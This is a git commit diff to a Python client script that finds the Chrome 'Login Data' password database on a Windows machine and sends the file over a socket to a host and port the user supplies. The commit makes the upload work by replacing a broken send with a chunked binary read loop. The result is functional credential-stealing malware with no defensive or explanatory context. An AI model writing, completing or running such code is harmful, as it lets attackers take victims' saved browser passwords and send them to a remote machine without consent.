ec0377ef63e30803df2df6f35b6724ef18ee90cf
loopdee43 <90978974+loopdee43@users.noreply.github.com>
2022-05-09 12:39:36 -0400

    Update client.py

--- client.py
+++ client.py
@@ -1,13 +1,17 @@
 import socket
 import os
-IP_ADDR = "YOUR IP HERE"
-PORT = YOUR PORT HERE
+IP_ADDR = "INPUT YOUR IP HERE"
+PORT = INPUT YOUR PORT HERE
 s = socket.socket()
 s.connect((IP_ADDR, PORT))
 db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
-filename = "ChromePasswords.db"
-file = open(db_path)
-s.send(file.encode("utf-8"))
+with open(db_path, 'rb') as f:
+  while True:
+    bytes_read = f.read(1024)
+    if not bytes_read:
+      break
+    s.sendall(bytes_read)
+s.close()
 
 
     
